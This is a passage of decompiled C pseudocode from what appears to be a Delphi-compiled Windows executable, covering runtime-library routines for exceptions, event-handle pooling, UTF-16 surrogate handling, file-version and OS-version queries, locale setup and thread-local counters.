  if ( (unsigned int)(unsigned __int8)v1 - 3 < 8 )
    goto LABEL_4;
  if ( (unsigned __int8)v1 == 11 )
  {
    v4 = (int *)sub_41AC80((int)&savedregs);
  }
  else
  {
    if ( (unsigned int)(unsigned __int8)v1 - 12 < 0xA )
    {
LABEL_4:
      v2 = off_467F64[(unsigned __int8)*((char *)off_468170 + 8 * (unsigned __int8)v1 - 24)];
      v3 = *((_DWORD *)off_468170 + 2 * (unsigned __int8)v1 - 5);
      LOBYTE(v1) = 1;
      v4 = (int *)unknown_libname_85(v2, v1, v3);
      goto LABEL_7;
    }
    v11 = *v13;
    v12 = 0;
    sub_40B51C((int **)off_467ED4, &v10);
    v4 = (int *)Sysutils::Exception::Exception(0, &v11);
  }
LABEL_7:
  if ( sub_40576C(v4, (int)off_412914) )
    v4[6] = (int)v13;
  (*(void (__fastcall **)(int *, int *, int))*v4)(v4, v13, *v4);
  __writefsdword(0, (unsigned int)v7);
  v9 = &loc_41AF74;
  sub_406C44(&v10);
  return v4;
}
// 412914: using guessed type int (*off_412914[2])();
// 41A744: using guessed type int __fastcall unknown_libname_85(_DWORD, _DWORD, _DWORD);
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);
// 41ABDC: using guessed type int __fastcall unknown_libname_87(_DWORD);
// 467F64: using guessed type int (***off_467F64)();
// 468170: using guessed type void *off_468170;

//----- (0041AF7C) --------------------------------------------------------
char __fastcall sub_41AF7C(int a1)
{
  int *v2; // esi
  char result; // al

  v2 = *(int **)(a1 + 24);
  result = sub_40576C(v2, (int)off_411F40);
  if ( result )
    return (*(int (__fastcall **)(int *, int))*v2)(v2, a1);
  return result;
}
// 411F40: using guessed type int (*off_411F40[2])();

//----- (0041B040) --------------------------------------------------------
void *sub_41B040()
{
  void *result; // eax

  if ( dword_46C7A4 )
  {
    *(_BYTE *)(dword_46C7A4 + 24) = 1;
    (*(void (**)(void))(*(_DWORD *)dword_46C7A4 - 8))();
    dword_46C7A4 = 0;
  }
  if ( dword_46C7A8 )
  {
    *(_BYTE *)(dword_46C7A8 + 24) = 1;
    sub_405598((_DWORD *)dword_46C7A8);
    dword_46C7A8 = 0;
  }
  *off_467EE4[0] = 0;
  *off_467F98[0] = 0;
  *(_DWORD *)off_467F34 = 0;
  *off_467F8C = 0;
  *off_467F9C = 0;
  result = off_4680B8;
  *(_DWORD *)off_4680B8 = 0;
  return result;
}
// 467EE4: using guessed type int *off_467EE4[2];
// 467F34: using guessed type void *off_467F34;
// 467F8C: using guessed type int *off_467F8C;
// 467F98: using guessed type int *off_467F98[2];
// 467F9C: using guessed type int *off_467F9C;
// 4680B8: using guessed type void *off_4680B8;
// 46C7A4: using guessed type int dword_46C7A4;
// 46C7A8: using guessed type int dword_46C7A8;

//----- (0041B0C0) --------------------------------------------------------
void *sub_41B0C0()
{
  void *result; // eax

  if ( !++dword_46C678 )
    return sub_41B040();
  return result;
}
// 46C678: using guessed type int dword_46C678;

//----- (0041B0D0) --------------------------------------------------------
DWORD __fastcall sub_41B0D0(HANDLE hHandle, DWORD dwMilliseconds)
{
  return WaitForSingleObject(hHandle, dwMilliseconds);
}

//----- (0041B0D8) --------------------------------------------------------
signed __int32 __fastcall sub_41B0D8(volatile signed __int32 *a1, volatile signed __int32 *a2)
{
  signed __int32 v3; // ecx
  signed __int32 result; // eax

  do
  {
    v3 = *a1;
    *a2 = *a1;
    result = _InterlockedCompareExchange(a1, (signed __int32)a2, v3);
  }
  while ( v3 != result );
  return result;
}

//----- (0041B0EC) --------------------------------------------------------
signed __int32 *__fastcall sub_41B0EC(volatile signed __int32 *a1)
{
  signed __int32 *v1; // edx

  do
    v1 = (signed __int32 *)*a1;
  while ( *a1 && v1 != (signed __int32 *)_InterlockedCompareExchange(a1, *v1, (signed __int32)v1) );
  return v1;
}

//----- (0041B108) --------------------------------------------------------
HANDLE sub_41B108()
{
  int v0; // edx
  volatile signed __int32 *i; // ebx
  HANDLE EventW; // esi

  v0 = 0;
  for ( i = (volatile signed __int32 *)&unk_46C7B0; *i || _InterlockedCompareExchange(i, 1, 0); i += 2 )
  {
    if ( ++v0 == 32 )
    {
      EventW = CreateEventW(0, 0, 0, 0);
      ResetEvent(EventW);
      return EventW;
    }
  }
  if ( !*((_DWORD *)i + 1) )
    *((_DWORD *)i + 1) = CreateEventW(0, 0, 0, 0);
  return (HANDLE)*((_DWORD *)i + 1);
}

//----- (0041B16C) --------------------------------------------------------
int __fastcall sub_41B16C(HANDLE hObject)
{
  int v1; // ecx
  HANDLE *v2; // edx

  v1 = 32;
  v2 = (HANDLE *)&unk_46C7B4;
  do
  {
    if ( hObject == *v2 )
      return _InterlockedExchange((volatile __int32 *)v2 - 1, 0);
    v2 += 2;
    --v1;
  }
  while ( v1 );
  return CloseHandle_0(hObject);
}

//----- (0041B190) --------------------------------------------------------
HANDLE sub_41B190()
{
  signed __int32 *v0; // eax
  HANDLE EventW; // ebx

  v0 = sub_41B0EC(&dword_46C7AC);
  if ( v0 )
  {
    EventW = (HANDLE)v0[1];
    v0[1] = 0;
    sub_41B0D8(&dword_46C8B0, v0);
  }
  else
  {
    EventW = CreateEventW(0, 0, 0, 0);
  }
  ResetEvent(EventW);
  return EventW;
}
// 46C7AC: using guessed type int dword_46C7AC;
// 46C8B0: using guessed type int dword_46C8B0;

//----- (0041B1D0) --------------------------------------------------------
signed __int32 __fastcall sub_41B1D0(signed __int32 a1)
{
  signed __int32 *Mem; // eax

  Mem = sub_41B0EC(&dword_46C8B0);
  if ( !Mem )
    Mem = (signed __int32 *)System::__linkproc__ GetMem(8);
  Mem[1] = a1;
  return sub_41B0D8(&dword_46C7AC, Mem);
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 46C7AC: using guessed type int dword_46C7AC;
// 46C8B0: using guessed type int dword_46C8B0;

//----- (0041B1FC) --------------------------------------------------------
DWORD __fastcall sub_41B1FC(HANDLE hEvent, HANDLE hHandle, DWORD dwMilliseconds)
{
  int v3; // ebx

  if ( !hEvent || hHandle )
  {
    if ( !hHandle || hEvent )
      return 1;
    else
      return sub_41B0D0(hHandle, dwMilliseconds);
  }
  else
  {
    v3 = 0;
    SetEvent(hEvent);
  }
  return v3;
}

//----- (0041B230) --------------------------------------------------------
int *sub_41B230()
{
  int *result; // eax

  result = off_468000;
  *off_468000 = (int)&off_466524;
  return result;
}
// 466524: using guessed type int (*off_466524)();
// 468000: using guessed type int *off_468000;

//----- (0041B23C) --------------------------------------------------------
int __fastcall sub_41B23C(int result)
{
  int v1; // ebx
  int v2; // esi

  v1 = result;
  if ( result )
  {
    do
    {
      v2 = *(_DWORD *)v1;
      if ( *(_DWORD *)(v1 + 4) )
        CloseHandle_0(*(HANDLE *)(v1 + 4));
      result = System::__linkproc__ FreeMem(v1);
      v1 = v2;
    }
    while ( v2 );
  }
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (0041B26C) --------------------------------------------------------
int __usercall sub_41B26C@<eax>(int result@<eax>, int a2@<edx>, long double a3@<st0>)
{
  int v3; // esi
  int v4; // ebx
  double v5; // [esp+8h] [ebp-8h]

  if ( a2 >= 0 )
  {
    v3 = a2 + 1;
    v4 = result;
    do
    {
      Sysutils::Now();
      v5 = a3;
      do
      {
        Sysutils::Now();
        a3 = a3 - v5;
      }
      while ( a3 <= 0.000000011574074074074074074 && _InterlockedCompareExchange((volatile signed __int32 *)v4, 1, 0) );
      result = *(_DWORD *)(v4 + 4);
      if ( result )
        result = CloseHandle_0(*(HANDLE *)(v4 + 4));
      v4 += 8;
      --v3;
    }
    while ( v3 );
  }
  return result;
}

//----- (0041B2D0) --------------------------------------------------------
int __usercall sub_41B2D0@<eax>(long double a1@<st0>)
{
  sub_41B23C(_InterlockedExchange(&dword_46C7AC, 0));
  sub_41B23C(_InterlockedExchange(&dword_46C8B0, 0));
  return sub_41B26C((int)&unk_46C7B0, 31, a1);
}
// 46C7AC: using guessed type int dword_46C7AC;
// 46C8B0: using guessed type int dword_46C8B0;

//----- (0041B30C) --------------------------------------------------------
int __usercall sub_41B30C@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edx>, int a3@<ebx>)
{
  DWORD Info; // eax
  LPVOID Buffer; // [esp+0h] [ebp-10h] BYREF

  Buffer = 0;
  Info = NetWkstaGetInfo(0, 0x64u, (LPBYTE *)&Buffer);
  LOBYTE(a3) = Info == 0;
  if ( Info )
  {
    *a1 = 0;
    *a2 = 0;
  }
  else
  {
    *a1 = *((_DWORD *)Buffer + 3);
    *a2 = *((_DWORD *)Buffer + 4);
  }
  if ( Buffer )
    NetApiBufferFree(Buffer);
  return a3;
}

//----- (0041B35C) --------------------------------------------------------
int sub_41B35C()
{
  int result; // eax
  struct _OSVERSIONINFOW v1; // [esp+0h] [ebp-114h] BYREF

  dword_465DC8 = dword_46C774;
  dword_465DCC = dword_46C778;
  dword_465DD0 = dword_46C770;
  v1.dwOSVersionInfoSize = 276;
  result = GetVersionExW(&v1);
  if ( result )
  {
    dword_465DC4 = v1.dwPlatformId;
    return unknown_libname_51();
  }
  return result;
}
// 407824: using guessed type int unknown_libname_51(void);
// 465DC4: using guessed type int dword_465DC4;
// 465DC8: using guessed type int dword_465DC8;
// 465DCC: using guessed type int dword_465DCC;
// 465DD0: using guessed type int dword_465DD0;
// 46C770: using guessed type int dword_46C770;
// 46C774: using guessed type int dword_46C774;
// 46C778: using guessed type int dword_46C778;

//----- (0041B3B4) --------------------------------------------------------
int __fastcall sub_41B3B4(__int32 a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
  WCHAR *v6; // eax
  DWORD FileVersionInfoSizeW; // eax
  DWORD v8; // ebx
  WCHAR *v9; // eax
  DWORD v11; // [esp-24h] [ebp-48h]
  void *v12; // [esp-1Ch] [ebp-40h]
  unsigned int v13[2]; // [esp-18h] [ebp-3Ch] BYREF
  int *v14; // [esp-10h] [ebp-34h]
  unsigned int v15[2]; // [esp-Ch] [ebp-30h] BYREF
  int *v16; // [esp-4h] [ebp-28h]
  unsigned int puLen; // [esp+Ch] [ebp-18h] BYREF
  LPVOID lpBuffer; // [esp+10h] [ebp-14h] BYREF
  LPVOID lpData; // [esp+14h] [ebp-10h]
  DWORD dwHandle; // [esp+18h] [ebp-Ch] BYREF
  unsigned __int8 v21; // [esp+1Fh] [ebp-5h]
  __int32 v22; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v22 = 0;
  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_41B4B4;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v21 = 0;
  sub_407030(&v22, a1);
  sub_4071D0(&v22);
  v6 = (WCHAR *)sub_407790(v22);
  FileVersionInfoSizeW = GetFileVersionInfoSizeW(v6, &dwHandle);
  v8 = FileVersionInfoSizeW;
  if ( FileVersionInfoSizeW )
  {
    lpData = (LPVOID)System::__linkproc__ GetMem(FileVersionInfoSizeW);
    v14 = &savedregs;
    v13[1] = (unsigned int)&loc_41B497;
    v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v13);
    v12 = lpData;
    v11 = dwHandle;
    v9 = (WCHAR *)sub_407790(v22);
    if ( GetFileVersionInfoW(v9, v11, v8, v12) && VerQueryValueW(lpData, (LPWSTR)&SubBlock, &lpBuffer, &puLen) )
    {
      *a2 = (unsigned __int16)HIWORD(*((_DWORD *)lpBuffer + 4));
      *a3 = *((unsigned __int16 *)lpBuffer + 8);
      *a4 = (unsigned __int16)HIWORD(*((_DWORD *)lpBuffer + 5));
      v21 = 1;
    }
    __writefsdword(0, v13[0]);
    v14 = (int *)&loc_41B49E;
    System::__linkproc__ FreeMem(lpData);
  }
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_41B4BB;
  sub_406C44(&v22);
  return v21;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (0041B4CC) --------------------------------------------------------
int __fastcall sub_41B4CC(int a1, int a2)
{
  int v3; // edx
  unsigned __int16 v4; // cx

  v3 = 0;
  v4 = *(_WORD *)(a1 + 2 * a2 - 2);
  if ( v4 >= 0xD800u && v4 <= 0xDFFFu )
  {
    v3 = *(unsigned __int16 *)(a1 + 2 * a2 - 2);
    if ( (unsigned __int16)v3 < 0xD800u || (unsigned __int16)v3 > 0xDBFFu )
      LOBYTE(v3) = 2;
    else
      LOBYTE(v3) = 1;
  }
  return v3;
}

//----- (0041B530) --------------------------------------------------------
int __fastcall sub_41B530(int a1, int a2)
{
  int v3; // edi
  bool v4; // al
  int i; // ebx
  unsigned __int16 v6; // si
  int v9; // [esp+0h] [ebp-14h]

  v3 = a1;
  v9 = 0;
  if ( a2 > 0 )
  {
    if ( a1 )
      a1 = *(_DWORD *)(a1 - 4);
    v4 = a1 < a2;
  }
  else
  {
    v4 = 1;
  }
  if ( !v4 )
  {
    for ( i = 1; a2 >= i; ++v9 )
    {
      v6 = *(_WORD *)(v3 + 2 * i - 2);
      if ( v6 >= 0xD800u && v6 <= 0xDFFFu )
        i = sub_41B7DC(v3, i);
      else
        ++i;
    }
  }
  return v9;
}

//----- (0041B5A0) --------------------------------------------------------
int *__fastcall sub_41B5A0(int a1, int a2, int *a3, int *a4)
{
  int v4; // edi
  int v5; // edx
  int v6; // esi
  int v7; // ebx
  unsigned __int16 v8; // ax
  unsigned __int16 v10; // ax
  int *result; // eax

  v4 = a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  v5 = a1;
  v6 = 1;
  v7 = 1;
  while ( v5 > v7 && v6 < a2 )
  {
    ++v6;
    v8 = *(_WORD *)(v4 + 2 * v7 - 2);
    if ( v8 >= 0xD800u && v8 <= 0xDFFFu )
    {
      v7 += 2;
      if ( v5 < v7 )
      {
        --v6;
        --v7;
      }
    }
    else
    {
      ++v7;
    }
  }
  if ( v6 == a2 && v5 > v7 )
  {
    v10 = *(_WORD *)(v4 + 2 * v7 - 2);
    if ( v10 >= 0xD800u && v10 <= 0xDFFFu )
      v7 = sub_41B7DC(v4, v7) - 1;
  }
  *a3 = v6;
  result = a4;
  *a4 = v7;
  return result;
}

//----- (0041B640) --------------------------------------------------------
__int64 __fastcall sub_41B640(int a1, int a2)
{
  int v3; // esi
  bool v4; // al
  int v5; // edi
  char v6; // al
  int v7; // eax
  int v8; // eax
  bool v9; // al
  __int64 v11[2]; // [esp+0h] [ebp-14h] BYREF

  v3 = a1;
  LODWORD(v11[0]) = 0;
  if ( a2 > 0 )
  {
    if ( a1 )
      a1 = *(_DWORD *)(a1 - 4);
    v4 = a1 < a2;
  }
  else
  {
    v4 = 1;
  }
  if ( !v4 )
  {
    v5 = a2 - 1;
    sub_41B5A0(v3, a2 - 1, (int *)v11 + 1, (int *)v11);
    if ( v5 <= SHIDWORD(v11[0]) )
    {
      v7 = v3;
      if ( v3 )
        v7 = *(_DWORD *)(v3 - 4);
      if ( v7 > SLODWORD(v11[0]) )
      {
        v6 = 0;
      }
      else
      {
        if ( LODWORD(v11[0]) == 1 )
        {
          v8 = v3;
          if ( v3 )
            v8 = *(_DWORD *)(v3 - 4);
          v9 = v8 >= SLODWORD(v11[0]);
        }
        else
        {
          v9 = 0;
        }
        v6 = !v9;
      }
    }
    else
    {
      v6 = 1;
    }
    if ( v6 )
    {
      LODWORD(v11[0]) = 0;
    }
    else if ( a2 > 1 )
    {
      ++LODWORD(v11[0]);
    }
  }
  return v11[0];
}

//----- (0041B6D4) --------------------------------------------------------
__int64 __fastcall sub_41B6D4(int a1, int a2)
{
  int v2; // ebx
  int v3; // eax
  int v4; // eax
  int v5; // eax
  __int64 v7[2]; // [esp+0h] [ebp-10h] BYREF

  v2 = a1;
  LODWORD(v7[0]) = 0;
  if ( a2 > 0 )
  {
    if ( a1 )
      a1 = *(_DWORD *)(a1 - 4);
    if ( a1 < a2 )
    {
      v3 = v2;
      if ( v2 )
        v3 = *(_DWORD *)(v2 - 4);
      a2 = v3;
    }
    sub_41B5A0(v2, a2, (int *)v7 + 1, (int *)v7);
    v4 = v2;
    if ( v2 )
      v4 = *(_DWORD *)(v2 - 4);
    if ( 2 * v4 < SLODWORD(v7[0]) )
    {
      v5 = v2;
      if ( v2 )
        v5 = *(_DWORD *)(v2 - 4);
      LODWORD(v7[0]) = 2 * v5;
    }
  }
  return v7[0];
}

//----- (0041B738) --------------------------------------------------------
int __fastcall sub_41B738(_WORD *a1)
{
  if ( *a1 < 0xD800u || *a1 > 0xDBFFu || a1[1] < 0xDC00u || a1[1] > 0xDFFFu )
    return 2;
  else
    return 4;
}

//----- (0041B768) --------------------------------------------------------
unsigned __int16 *__fastcall sub_41B768(unsigned __int16 *result)
{
  unsigned __int16 v1; // dx

  v1 = *result;
  if ( *result < 0xD800u || v1 > 0xDBFFu || result[1] < 0xDC00u || result[1] > 0xDFFFu )
  {
    if ( v1 )
      ++result;
  }
  else
  {
    result += 2;
  }
  return result;
}

//----- (0041B798) --------------------------------------------------------
int __fastcall sub_41B798(int a1, int a2)
{
  int v4; // edx
  unsigned __int16 v5; // ax
  int v7; // eax

  v4 = 2;
  v5 = *(_WORD *)(a1 + 2 * a2 - 2);
  if ( v5 >= 0xD800u && v5 <= 0xDFFFu )
  {
    v7 = sub_407790(a1);
    return sub_41B738((_WORD *)(2 * a2 + v7 - 2));
  }
  return v4;
}

//----- (0041B7DC) --------------------------------------------------------
int __fastcall sub_41B7DC(int a1, int a2)
{
  int v4; // edx
  unsigned __int16 v5; // ax
  int v7; // eax

  v4 = a2 + 1;
  v5 = *(_WORD *)(a1 + 2 * a2 - 2);
  if ( v5 >= 0xD800u && v5 <= 0xDFFFu )
  {
    v7 = sub_407790(a1);
    return a2 + sub_41B738((_WORD *)(2 * a2 + v7 - 2)) / 2;
  }
  return v4;
}

//----- (0041B828) --------------------------------------------------------
int __fastcall sub_41B828(int a1, int a2)
{
  int v3; // ebx
  unsigned int v4; // esi
  int v5; // eax
  int v6; // ebx
  _WORD *v8; // [esp-8h] [ebp-1Ch]
  int v9; // [esp+0h] [ebp-14h]

  v9 = 0;
  v3 = a2;
  if ( a2 )
    v3 = *(_DWORD *)(a2 - 4);
  v4 = a1;
  if ( a1 )
    v4 = *(_DWORD *)(a1 - 4);
  v8 = (_WORD *)sub_407790(a1);
  v5 = sub_407790(a2);
  v6 = sub_415A6C(v5, v8, v3, v4);
  if ( v6 )
    return (v6 - sub_407790(a2)) / 2 + 1;
  return v9;
}

//----- (0041B888) --------------------------------------------------------
// attributes: thunk
_WORD *__fastcall sub_41B888(_WORD *a1, _WORD *a2)
{
  return sub_415A14(a1, a2);
}

//----- (0041B890) --------------------------------------------------------
// attributes: thunk
_WORD *__fastcall sub_41B890(_WORD *a1, __int16 a2)
{
  return sub_4159E4(a1, a2);
}

//----- (0041B8F4) --------------------------------------------------------
int sub_41B8F4()
{
  LCID ThreadLocale; // eax
  int savedregs; // [esp+20h] [ebp+0h] BYREF

  Locale = 1033;
  *(&Locale + 1) = 9;
  *(&Locale + 2) = 1;
  ThreadLocale = GetThreadLocale();
  if ( ThreadLocale )
    Locale = ThreadLocale;
  if ( (_WORD)ThreadLocale )
  {
    *(&Locale + 1) = ThreadLocale & 0x3FF;
    *(&Locale + 2) = (unsigned __int16)ThreadLocale >> 10;
  }
  qmemcpy(&dword_465E08, dword_41B968, 0x20u);
  *((_BYTE *)&Locale + 13) = 1;
  *((_BYTE *)&Locale + 12) = 1;
  return unknown_libname_90(&savedregs);
}
// 41B898: using guessed type _DWORD __cdecl unknown_libname_90(_DWORD);
// 41B968: using guessed type int dword_41B968[8];
// 465E08: using guessed type int dword_465E08;

//----- (0041B988) --------------------------------------------------------
int __usercall sub_41B988@<eax>(int a1@<ecx>, int a2@<edi>)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-D8h] BYREF
  int *v4; // [esp-4h] [ebp-D0h]
  _DWORD v5[51]; // [esp+0h] [ebp-CCh] BYREF
  int savedregs; // [esp+CCh] [ebp+0h] BYREF

  v5[0] = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_41B9F0;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_41B8F4();
  sub_4195F4(Locale, (int)v5, a2);
  sub_407F98((int)&unk_46C698, (int)v5, (int)&byte_413DFC);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_41B9F7;
  return sub_407DEC((int)v5, (int)&byte_413DFC);
}
// 413DFC: using guessed type char byte_413DFC;
// 41B988: using guessed type _DWORD var_CC[51];

//----- (0041BB5C) --------------------------------------------------------
unsigned int __fastcall sub_41BB5C(LPCSTR lpMultiByteStr)
{
  int v2; // ebp
  unsigned int v3; // eax
  int v4; // edi
  WCHAR *Mem; // esi
  unsigned int v6; // ebx
  int v7; // eax
  int v8; // edx
  _BYTE v10[536]; // [esp+0h] [ebp-218h] BYREF

  v2 = sub_407110((int)lpMultiByteStr);
  v3 = sub_40B5B0(0xFDE9u, 0, lpMultiByteStr, v2, 0, 0);
  v4 = v3;
  if ( v3 <= 0x104 )
    Mem = (WCHAR *)v10;
  else
    Mem = (WCHAR *)System::__linkproc__ GetMem(2 * v3);
  sub_40B5B0(0xFDE9u, 0, lpMultiByteStr, v2, Mem, v4);
  CharUpperW(Mem);
  v6 = 0;
  if ( v4 - 1 >= 0 )
  {
    v7 = v4;
    v8 = 0;
    do
    {
      v6 = Mem[v8++] ^ ((v6 >> 27) | (32 * v6));
      --v7;
    }
    while ( v7 );
  }
  if ( Mem != (WCHAR *)v10 )
    System::__linkproc__ FreeMem(Mem);
  return v6;
}
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);

//----- (0041BBF0) --------------------------------------------------------
unsigned int __fastcall sub_41BBF0(const CHAR *a1)
{
  unsigned int result; // eax
  char v3; // bl
  const CHAR *v4; // [esp-4h] [ebp-Ch]

  result = 0;
  v4 = a1;
  while ( 1 )
  {
    result = __ROL4__(result, 5);
    v3 = *a1;
    if ( *a1 < 0 )
      break;
    if ( !v3 )
      return result;
    if ( v3 >= 65 && v3 <= 90 )
      v3 |= 0x20u;
    LOBYTE(result) = v3 ^ result;
    ++a1;
  }
  return sub_41BB5C(v4);
}

//----- (0041BC28) --------------------------------------------------------
int sub_41BC28()
{
  _DWORD *v0; // ebx
  int result; // eax

  v0 = (_DWORD *)*off_46815C;
  if ( *off_46815C )
  {
    do
    {
      if ( v0[6] )
      {
        System::__linkproc__ Dispose(v0[6], &byte_41BABC);
        result = 0;
        v0[6] = 0;
      }
      v0 = (_DWORD *)*v0;
    }
    while ( v0 );
  }
  return result;
}
// 408534: using guessed type int __fastcall System::__linkproc__ Dispose(_DWORD, _DWORD);
// 41BABC: using guessed type char byte_41BABC;
// 46815C: using guessed type int *off_46815C;

//----- (0041BC58) --------------------------------------------------------
_DWORD *__fastcall sub_41BC58(_DWORD *result)
{
  _DWORD *v1; // edx
  int v2; // ebx
  int v3; // ebp
  int v4; // esi
  _DWORD *v5; // eax
  int v6; // eax
  _DWORD *v7; // [esp+0h] [ebp-24h]
  unsigned int v8; // [esp+4h] [ebp-20h]
  _DWORD *v9; // [esp+8h] [ebp-1Ch]
  int v10; // [esp+10h] [ebp-14h]

  v1 = (_DWORD *)*off_46815C;
  if ( *off_46815C )
  {
    do
    {
      if ( (_DWORD *)v1[1] == result )
        break;
      v1 = (_DWORD *)*v1;
    }
    while ( v1 );
  }
  v7 = v1;
  if ( v1 )
  {
    result = v1;
    if ( v1[6] )
    {
      v2 = v1[6];
      if ( *(_BYTE *)v2 )
        v9 = &unk_46C8B4;
      else
        v9 = &unk_46D8A8;
      v10 = *(_DWORD *)(v2 + 4);
      if ( v10 )
        v10 = *(_DWORD *)(v10 - 4);
      if ( v10 - 1 >= 0 )
      {
        v3 = v10;
        v4 = 0;
        do
        {
          v5 = *(_DWORD **)(*(_DWORD *)(v2 + 4) + 24 * v4 + 4);
          if ( v5 )
          {
            *v5 = *(_DWORD *)(*(_DWORD *)(v2 + 4) + 24 * v4);
          }
          else if ( *(_DWORD *)(*(_DWORD *)(v2 + 4) + 24 * v4 + 12) )
          {
            v8 = sub_41BBF0(*(const CHAR **)(*(_DWORD *)(v2 + 4) + 24 * v4 + 12)) % 0x3FD;
            if ( v9[v8] == *(_DWORD *)(v2 + 4) + 24 * v4 )
              v9[v8] = *(_DWORD *)(*(_DWORD *)(v2 + 4) + 24 * v4);
          }
          v6 = *(_DWORD *)(*(_DWORD *)(v2 + 4) + 24 * v4);
          if ( v6 )
            *(_DWORD *)(v6 + 4) = *(_DWORD *)(*(_DWORD *)(v2 + 4) + 24 * v4 + 4);
          ++v4;
          --v3;
        }
        while ( v3 );
      }
      System::__linkproc__ Dispose(v2, &byte_41BABC);
      result = v7;
      v7[6] = 0;
    }
  }
  return result;
}
// 408534: using guessed type int __fastcall System::__linkproc__ Dispose(_DWORD, _DWORD);
// 41BABC: using guessed type char byte_41BABC;
// 46815C: using guessed type int *off_46815C;

//----- (0041BD80) --------------------------------------------------------
_DWORD *__usercall sub_41BD80@<eax>(int a1@<edi>)
{
  DWORD LastError_1; // eax

  LastError_1 = GetLastError_1();
  return sub_41BD90(LastError_1, 0, a1);
}

//----- (0041BD90) --------------------------------------------------------
_DWORD *__usercall sub_41BD90@<eax>(DWORD dwMessageId@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v3; // esi
  int v5; // edx
  int v6; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v9; // [esp-8h] [ebp-2Ch]
  int *v10; // [esp-4h] [ebp-28h]
  void *v11; // [esp+0h] [ebp-24h]
  int v12; // [esp+8h] [ebp-1Ch] BYREF
  int v13; // [esp+Ch] [ebp-18h] BYREF
  char v14; // [esp+10h] [ebp-14h]
  int v15; // [esp+14h] [ebp-10h]
  char v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  char v18; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v12 = 0;
  v3 = a2;
  v10 = &savedregs;
  v9 = &loc_41BE27;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( dwMessageId )
  {
    v13 = dwMessageId;
    v14 = 0;
    sub_4194F8(dwMessageId, 0, &v12);
    v15 = v12;
    v16 = 17;
    v17 = v3;
    v18 = 17;
    LOBYTE(v5) = 1;
    v6 = Sysutils::Exception::Exception((int)off_4137E0, v5, off_4680E0, (int)&v13, 2);
  }
  else
  {
    LOBYTE(a2) = 1;
    v6 = Sysutils::Exception::Exception((int)off_4137E0, a2, off_4681A4);
  }
  *(_DWORD *)(v6 + 24) = dwMessageId;
  sub_406340(v6, dwMessageId, (int)&savedregs, a3, v3);
  __writefsdword(0, (unsigned int)v9);
  v11 = &loc_41BE2E;
  return sub_406C44(&v12);
}
// 41BDEA: variable 'v5' is possibly undefined
// 4137E0: using guessed type int (*off_4137E0[2])();

//----- (0041BE44) --------------------------------------------------------
int sub_41BE44()
{
  _DWORD *v0; // ebx
  int result; // eax

  while ( dword_466538 )
  {
    v0 = dword_466538;
    dword_466538 = (_DWORD *)*dword_466538;
    result = System::__linkproc__ FreeMem(v0);
  }
  return result;
}
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 466538: using guessed type _DWORD *dword_466538;

//----- (0041BF54) --------------------------------------------------------
int *__fastcall sub_41BF54(Sysutils::TThreadLocalCounter *this, int **a2)
{
  unsigned __int8 v4; // bl
  DWORD CurrentThreadId_0; // edi
  int *result; // eax

  v4 = Sysutils::TThreadLocalCounter::HashIndex(this);
  CurrentThreadId_0 = GetCurrentThreadId_0();
  for ( result = (int *)*((_DWORD *)this + v4 + 1); result && CurrentThreadId_0 != result[1]; result = (int *)*result )
    ;
  if ( !result )
  {
    result = sub_41BFCC(this);
    if ( !result )
    {
      result = (int *)System::AllocMem(0x10u);
      result[1] = CurrentThreadId_0;
      result[2] = 0x7FFFFFFF;
      *result = (int)result;
      *result = _InterlockedExchange((volatile __int32 *)this + v4 + 1, (__int32)result);
    }
  }
  *a2 = result;
  return result;
}

//----- (0041BFCC) --------------------------------------------------------
int *__fastcall sub_41BFCC(Sysutils::TThreadLocalCounter *this)
{
  int *v1; // ebx

  v1 = (int *)*((_DWORD *)this + (unsigned __int8)Sysutils::TThreadLocalCounter::HashIndex(this) + 1);
  if ( v1 )
  {
    while ( _InterlockedExchange(v1 + 2, 0x7FFFFFFF) == 0x7FFFFFFF )
    {
      v1 = (int *)*v1;
      if ( !v1 )
        return v1;
    }
    v1[1] = GetCurrentThreadId_0();
  }
  return v1;
}

//----- (0041C07C) --------------------------------------------------------
_DWORD *sub_41C07C()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  _DWORD *result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_41C118((Sysutils::TMultiReadExclusiveWriteSynchronizer *)v0, SHIDWORD(v0));
  sub_405588();
  CloseHandle_0(*(HANDLE *)(v2 + 16));
  CloseHandle_0(*(HANDLE *)(v2 + 20));
  result = sub_405598(*(_DWORD **)(v2 + 32));
  if ( v1 > 0 )
    return (_DWORD *)System::__linkproc__ ClassDestroy(v2);
  return result;
}
